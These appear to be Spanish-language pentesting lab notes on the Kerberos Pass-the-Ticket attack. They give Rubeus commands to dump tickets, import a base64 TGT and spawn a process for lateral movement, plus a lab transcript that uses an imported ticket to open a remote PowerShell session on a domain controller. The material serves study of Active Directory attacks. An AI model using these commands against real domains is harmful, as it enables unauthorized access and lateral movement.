# Pass the ticket
- Es una tecnica utilizada en ataques contra kerberos.
    - En lugar de usar la password o hash de una password, utilizamos el ticket kerberos para autenticarse y tener acceso a recursos protegidos.
- El flujo típico de Kerberos implica que:
1. Un usuario se autentica con su contraseña y recibe un Ticket Granting Ticket (TGT).
2. Con el TGT, el usuario solicita un Service Ticket (TGS) para acceder a servicios específicos (como SMB, HTTP, etc.).

## Diferencia con Pass The Hash
- PTH es para NTLM

### Para obtener y manipular estos tickets yo prefiero Rubeus ante todo, pero mimikatz también es una buena opción.

#### Exportar tickets
- `Rubeus.exe dump /nowrap`

#### Pass The Ticket formato base64
- `Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/`

## Movimiento lateral con Pass the Ticket
- `Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show`

### Ejemplo sacado de un laboratorio
- Importo el ticket
- Me conecto a otra computadora dentro de la red AD

```powershell
C:\tools>Rubeus.exe ptt /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6yFGd0R+uMeD0dWGow5p9KhUM8rPUeWQl1DSxyzR7pXLvFcabDnKxz9zWjvbgszJQ2qnrcnx7cpgCiRC759NvVnVRNo3Kd76PpQlJZ43DKcg5Cmkat76mx/Rz13ohmvlv4yaP0W04ckk3KoAKghKt9a70WUkNB/pg+WruCqnYwj3MFgxJhTTEaKduLUnGqoEabe25oM928xV32jeVZxDRK6ON30nOtnUsdZy0iwAg5rhNPfHTbydm4Z+mn3IThaVcz1VxtKP2I7L0JZEDhOM7ZPyp5DaQm1LsZTpiexXD0A6bm8/c/GruNJyuDVYVsfAuki9G/oyRZKsqRhg3RGaOU5uIC1ReDDqmIrE+7dha9kAgH8Kk1KzoK2sT38NZe0vC3zH+NzVB6VVvjCu/b5sLpcKXkLsOgTXhonubBkS39qwwEjm3d5iURMfyRwiRfpHnrlOtb6LdrtfpT++qzpdSK06D8sPpOVnBJ8ieNBNwOIHtMVw6X5XQalgZvA27s9ZCygwpXJUWuOo3hMcHSmihg9nlTNFb0HPGKQeV2Et1kKYffY1uG5iuxCBXbi6q5RO7fHtFysOJA5Tb05fXTfqbvRy6KCDyq7DcR68wzHucVBj39Tj5jlzmzL1PLOcB3W8PKW6win21TDgRBSYBD0v78jKFlrwdyu85PvPC3om/GvDDZAgk207dobYcMsT524wJpnIzVjZ/UV3RM9b5jlOtkj0j4ylDJ3gYdnha0yTkR73U1kiam48TgGBgQNy6EhCoij+YGqF/cmi7uMyDVwKWJKuoTxMZek/qKn3Qi6lxLaGxB5a2yS1uRgUK6f2AuWnT6sZZg6ymLC1jCvuhVkvlFbNpdwoqKaph9JZvvoBLZqOBRwPqMNaxK0WcRf6qxUNNhg0I5JHIY6DY00rK0bgckaNvPW/KdjzCbij2JhFADRVqTavob63bu3h81ekaXpfXsoEJPgPURqcKaMUJpCX9U7AA/2S/tkT+bIkoJEjkKiHrjcroB/8iuOvZ8tyFajP0uYDlXwZOZ+pMrNt3I9O0zIlaMikV8L3zOdz3c2C2cSzSvEtwFpCCImRXNjbSm4u8P0Rigy4EvH+zWiFvrXYjPCZUzu0At5LjVK7s2YUmYZhUrpLzinZnhaXVPo1+xQ5YUVbLRtpaOpkUYFp6OGWijLB3yP59W6igJwkLeNWVYWg2+uEGNj3F8YCwJLM1MkEpXWRkX/bnhP2lmPMbFEcb4vn2nv7S6p/PBwnBbqtujFWT84i9VtlEyZZh7T2k0bMMbe4RNKIyVK2NO6gqT8leREYTuDWM93fQLv2ZOzMxkORrmKRZ/q6Wq+mgYMeEQnD4Ay3tVXJD7020ks/aDRsPPRbFCeovptOUWC6yt2OPS9YU4ys1LWLW4abPqlabXYNdt7dPmWU9GHPLNA8g7ZrBojHrZSYiQ0svyXujgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCADMjCsbUV8Hjm5IC2rhbj2EgAQ+J0wUBQU3jWviJ+Xm6ETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNTAxMDMwNTI4MDZaphEYDzIwMjUwMTAzMTUyODA2WqcRGA8yMDI1MDExMDA1MjgwNlqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Import Ticket
[+] Ticket successfully imported!

C:\tools>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-Pssession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
```